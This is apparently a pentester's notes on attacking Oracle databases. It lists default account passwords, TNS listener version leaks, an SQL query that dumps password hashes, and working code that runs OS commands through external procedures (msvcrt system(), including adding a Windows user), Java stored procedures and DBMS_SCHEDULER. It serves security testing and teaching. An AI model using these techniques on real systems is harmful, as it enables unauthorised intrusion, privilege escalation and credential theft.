# Oracle RDBMS

## Derivation of version and patch information from hosts running Oracle software.

### In Oracle DB versions < 10g
**TNS Listener:**

Listener Control Utility (`lsnrctl`) can be used to remotely adminster the listener. In versions before 10g, by default the listener is not set with a password. This utility can be used to query the listener for registered database services and retrieve status information, inluding the db version.

Example:

```
C:\oracle\ora92\bin>lsnrctl 
```
```
LSNRCTL for 32-bit Windows: Version 9.2.0.1.0 - Production on 10-OCT-2004 17:31:49 Copyright (c) 1991, 2002, oracle Corporation. All rights reserved. Welcome to LSNRCTL, type "help" for information. 
LSNRCTL> set current listener 10.1.1.1 Current Listener is 192.168.0.34 
LSNRCTL> status Connecting to (DESCRIPTION=(CONNECT_DATA=(SID=*)(SERVICE_NAME=10.1.1.1)) (ADDRESS=(PROTOCOL=TCP)(HOST=10.1.1.1)(PORT=1521))) STATUS of the LISTENER ------------------------ 
Alias                       LISTENER Version TNSLSNR for 32-bit Windows: 
Version 9.2.0.1.0 
- Production Start 
Date                        10-OCT-2004 16:12:50 Uptime 0 days 1 hr. 19 min. 23 sec 
Trace Level                 off 
Security                    ON 
SNMP                        OFF 
Listener Parameter File     C:\oracle\ora92\network\admin\listener.ora 
Listener Log File           C:\oracle\ora92\network\log\listener.log 
Listening Endpoints Summary... 
    (DESCRIPTION=(ADDRESS=(PROTOCOL=ipc)(PIPENAME=\\.\pipe\EXTPROCOipc))) 
    (DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=GLADIUS)(PORT=1521))) 
    (DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=GLADIUS)(PORT=8080)) 
(Presentation=HTTP)(Session=RAW))
```
- You can also use the **lsnrctl** `version` command to get the version, if the listener password has not been set, or you have the creds already.
- If a password has been set, the **lsnrctrl** `status` will return the version information (*on Oracle DB prior to 10g*)

**Using Invalid packets:**

- If the TNS Listener receives an invalid packet, it will leak the DB version number in the `VSNNUM` field of the reply packet. Convert the number into hex to get the decimal DB version number. Eg. 151000065 = `9001401` which is (9.0.1.4.1)

## Default Oracle accounts.
**NOTE:** 
> Passwords for all Oracle system administration accounts except SYS, SYSTEM, SYSMAN, and DBSNMP are revoked after installation. Additional accounts are created depending on the components installed (These are also created in a locked state).

>Before you use a locked account, you must unlock it and reset its password. You can unlock a password using the `Database Configuration Assistant` or `SQL*Plus`. When using `SQL*Plus` to unlock an account, you can change the password any time after installation.

> When using the `Database Configuration Assistant`, If a password is unlocked and a new password is not specified, then the password is expired until the next time the account is accessed. 

>You can use the same or different passwords for the SYS, SYSTEM, SYSMAN, and DBSNMP administrative accounts. Oracle recommends that you use different passwords for each.

>If you use Database Configuration Assistant to create a new database, then it requires you to create passwords for the SYS and SYSTEM accounts.

- SYS (*highest privileged account in Oracle DB*)
- SYSTEM (*Similar level of privileges as the `sys` account*)
- DBSNMP (*Used by Management Agent of Oracle Enterprise Manager to monitor and manage the database*)
- SYSMAN (*The account used to perform Oracle Enterprise Manager database administration tasks*)
- OUTLN (*Has the EXECUTE ANY PROCEDURE system privilige*)

### Known default creds

| Account | Password|
| --------| --------|
|DBSNMP | DBSNMP|
|SYS |	CHANGE_ON_INSTALL|
|SYSMAN| OEM_TEMP|
|SYSTEM| MANAGER|
|SYSMAN| SYSMAN|
|SCOTT| TIGER |
|OUTLN| OUTLN|

### Enumerating the Oracle DB

#### TNS Listener
- **Oracle 9**
    - In Oracle 9, the XML Database is enabled by default. If the XML Database is enabled in Oracle 9 or later, the TNS Listener holds open TCP port `2100` and `8080`. TCP port 2100 is used for querying the XML data over `FTP` and 8080 over `HTTP`.
    - In versions prior to Oracle `10g`, the TNS Listener could be remotely administered. In the affected versions, the default TNS Listener was installed without a password, which made it possible anyone to administer the Listener. You can use the listener to get db version and service information (eg. getting the `SID`).

- **Oracle > 10g**
    - To connect to an Oracle DB, you'll need to enumerate the `SID` (a db instance). This is done by `brute-force` techniques (unless one is already known). You can use the `Oracle Database Attacking Tool` (**ODAT**) for this.
    - With a valid SID, you can make a db connection and start enumerating users. Again this is done by password guessing / `brute-force`. Default accounts and creds should be checked here.

#### Useful places to look on a test
- Looking in SYS.LINK$ table for passwords		
- Trying to collect a list of users from the SYS.ALL_USERS table		
- Trying to collect a list of old password hashes from SYS.USER_HISTORY$		
- Trying to collect a list of accounts and password hashes from the SYS.USER$ table		
- Trying to collect a list of users and password hashes from the DBA_USER view		
- Trying to collect info on profiles from DBA_PROFILES		
- Trying to collect info on parameters from V$PARAMETER		
- Trying to collect a list of accounts and possible passwords from the SYS.AUD$ table

If you manage to get an account with DBA privileges or the `SYS` or `SYSTEM` accounts, then you can extract a list of username and passwords (hashes) from the DB with the following:

```sql
select name,password from sys.user$ where type#=1;
```
**Note:** *Passwords in Oracle are converted to uppercase, making them easier to crack.*

## Privilege Escalation

### External Procedures

PL/SQL can be extended by calling external procedures. External procudures are exported by `shared objects` or `dynamic link libraries`. A typical use-case for external procedures is perform a complex task that can't be coded with PL/SQL, e.g check a Windows registry value from a running Oracle app. 

Using the registry example, we would first need to write the `C` code that check the value in the Windows registry, then export this as a DLL. 

*Steps:*
1. Write the function (eg. **CheckReg()**) to check Windows registry value.
2. Export the function as a DLL
3. Create a LIBRARY in Oracle so Oracle DB can see the DLL.
4. Create a procedure that calls the **CheckReg()** function
```sql
CREATE OR REPLACE PROCEDURE C_REG IS
IS EXTERNAL
NAME "CheckReg"
LIBRARY CHK_REG
LANGUAGE C;
END C_REG;
```
5. Call the C_REG external procedure.

When the external procudure is called, the following happens:
- The main **Oracle process** connects to the TNS Listener and requests the external procedure.
- The Listener launches the `extproc` process and tells the **Oracle process** to connect to `extproc`
- **Oracle process** tells `extproc` to load the checkregistry.dll and execute the CheckReg() function.

#### Abuse Case (Run OS Commands)

If you create an Oracle library for something like `msvcrt.dll` or `libc`, you can use this to call the **system()**  function an execute OS commands :tada:

For example (*taken from Database Hackers book*):

*library creation*
```sql
CREATE OR REPLACE LIBRARY
exec_shell AS 'C:\WINDOWS\system32\msvcrt.dll';
```

*procedure creation*
```sql
show errors
CREATE OR REPLACE PACKAGE oracmd IS
PROCEDURE exec(cmdstring IN CHAR)
end oracmd;
/
show errors
CREATE OR REPLACE PACKAGE BODY oracmd IS
PROCEDURE exec(cmdstring IN CHAR)
IS EXTERNAL
NAME "system"
LIBRARY exec_shell
LANGUAGE C;
end oracmd
/
```
You can now use the procedure to directly run OS commands. The example below adds a user:
```powershell
exec oracmd.exec('net user dbhacker password!! /add');
```
:exclamation: External procedures present a massive security risk and are recommended to be disabled where possible

### PL/SQL (Java Stored Procedures)
If you have access to an account that has the **DBMS_JAVA** role, you can use this permission to create a Java stored procedure in `PL/SQL`. The java stored procedure can be used to execute `system` commands on the host. An example from hacktricks is shown below:

1. *Connect via SQLPlus*
```
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
  public class oraexec
  {
    public static void execCommand(String command) throws IOException
    {
      Runtime.getRuntime().exec(command);
    }
  }
/
```
2. *Create PL/SQL wrapper*

```
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
3. *Execute the query*

```
exec javacmd('command');
```
### PL/SQL (Stored Procedures with Definer Permissions)
By default, when a PL/SQL stored procedure is created, it is created with **Definer** permissions. This means: 
- When the procedure is executed, the execution is performed with the privileges of the account who created. For example, if the procedure is created by the `SYS` account, and `SCOTT` executes the procedure, it is done with the privileges of `SYS`.
- This behaviour can be abused when some packages contain procedures that are executable to lower privileged accounts (eg. PUBLIC), while also not creating the procedure using the `AUTHID CURRENT_USER` keyword to denote execution with `user` permissions. 
- In this scenario, if the procudure performs any adminsistrative tasks, the lower privileged user can utilise it as an escalation point.
- If the procedure take parameters and is **SQL injectable**, the definer permissions could be abused to execute additional stored procedure commands. Eg. Escalate your privilges via a role grant.

### Cracking an account with DB Grant
If you find an account that have role granting privileges, you could attempt to crack the accounts password, and elevate your privileges by granting your user DBA. For example:

```sql
BEGIN
EXECUTE IMMEDIATE GRANT DBA TO SCOTT; 
END;
```

### DBMS_Scheduler (OS Command Injection)
- In Oracle 10g, a new package `DBMS_Scheduler` was added to Oracle DB. This package can be used to run operating system commands.
- The CREATE_JOB procedure creates jobs to be run by the db server, which can have a **job_type** of **pqsql_block**. This block is basically a block of PL/SQL stored_procedure, which indicates that it is external and can be executed outside of the RDBMS.

*Example from Database Hackers book*

```sql
dbms_scheduler.create_job(
    job_name    => 'cmd',
    job_type    => 'executable',
    job_action  => '/tmp/oracle.sh',
    enabled     => TRUE,
    auto_drop   => TRUE
);
```
```powershell
exec dbms_scheduler.run_job('cmd');
```
### Refs (Default accounts and passwd)

- [Oracle 9i - Default administrative usernames and passwords](https://docs.oracle.com/html/A95493_02/startrdb.htm#BDCFDGHJ)
- http://www.petefinnigan.com/default/oracle_default_passwords.htm
- [Oracle 11g - Securing Oracle Database User Accounts
](https://docs.oracle.com/cd/E11882_01/server.112/e10575/tdpsg_user_accounts.htm#TDPSG20000)

### Oracle Database Pentesting
- http://pentestdiary.blogspot.com/2017/08/oracle-database-penetration-testing.html
- http://www.red-database-security.com/wp/oracle_cheat.pdf 
- https://www.whiteoaksecurity.com/blog/exploiting-oracle-databases-with-odat/

